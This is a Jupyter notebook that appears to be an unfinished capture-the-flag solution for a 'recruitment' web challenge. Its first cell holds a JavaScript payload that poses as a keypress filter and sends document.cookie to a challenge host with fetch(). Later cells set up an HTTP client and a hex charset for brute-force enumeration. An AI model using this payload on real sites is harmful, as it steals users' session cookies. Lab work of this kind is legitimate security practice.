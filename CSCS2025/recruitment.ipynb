{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "99d55df4",
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = \"\"\"//MAIN\n",
    "function filterinput(e) {\n",
    " var chrTyped, chrCode=0, evt=e?e:event;\n",
    " if (evt.charCode!=null)     chrCode = evt.charCode;\n",
    " else if (evt.which!=null)   chrCode = evt.which;\n",
    " else if (evt.keyCode!=null) chrCode = evt.keyCode;\n",
    "\n",
    " if (chrCode==0) chrTyped = 'SPECIAL KEY';\n",
    " else chrTyped = String.fromCharCode(chrCode);\n",
    "\n",
    "\n",
    " if (chrTyped.match(/[^<>=]/)) return true;\n",
    " if (evt.altKey || evt.ctrlKey || chrCode<28 || chrTyped == \"SPECIAL KEY\") return true;\n",
    "\n",
    " if (evt.preventDefault) evt.preventDefault();\n",
    " evt.returnValue=false;\n",
    " return false;\n",
    "}\n",
    "\n",
    "function addEventHandler(elem,eventType,handler) {\n",
    " if (elem.addEventListener) elem.addEventListener (eventType,handler,false);\n",
    " else if (elem.attachEvent) elem.attachEvent ('on'+eventType,handler); \n",
    " else return 0;\n",
    " return 1;\n",
    "}\n",
    "\n",
    "function init() {\n",
    "\telem = document.getElementById(\"content\");\n",
    "\tif (elem){\n",
    "\t\t addEventHandler(elem,'keypress',filterinput);\n",
    "\t}\n",
    "}\n",
    "\n",
    "init();\n",
    "\n",
    "fetch(\"https://7d777985c6620c55ad912555-5000-recruitment.challenge.cscg.live:1337/service\", {\n",
    "\tmethod: \"PUT\",\n",
    "\theaders: {\n",
    "\t  \"Content-Type\": \"application/json\"\n",
    "\t},\n",
    "\tbody: \"//FLAG\\n\" + JSON.stringify({ cookies: document.cookie })\n",
    "  }\n",
    ");\n",
    "\n",
    "//TRAILER\n",
    "\"\"\"\n",
    "\n",
    "scripts = \"https://7d777985c6620c55ad912555-5000-recruitment.challenge.cscg.live:1337/\"\n",
    "app = \"https://7d777985c6620c55ad912555-5004-recruitment.challenge.cscg.live:1337/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "4ce17e0d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import httpx \n",
    "import random\n",
    "import string\n",
    "import itertools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "f518b9aa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0123456789abcdef'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "client = httpx.Client()\n",
    "charset = string.digits+\"abcdef\"\n",
    "charset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "93a13d20",
   "metadata": {},
   "outputs": [],
   "source": [
    "assert len(list(itertools.product(charset,repeat=3))) == len(charset)**3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c6b1939",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
